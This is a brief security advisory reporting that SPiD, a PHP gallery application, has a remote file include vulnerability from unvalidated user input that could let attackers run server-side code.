SPiD is a gallery management application written in PHP.

SPiD is prone to a remote file include vulnerability, due to lack of validation of user input.

An attacker may leverage this issue to execute arbitrary server-side script code on an affected computer with the privileges of the Web server process. This may facilitate unauthorized access.
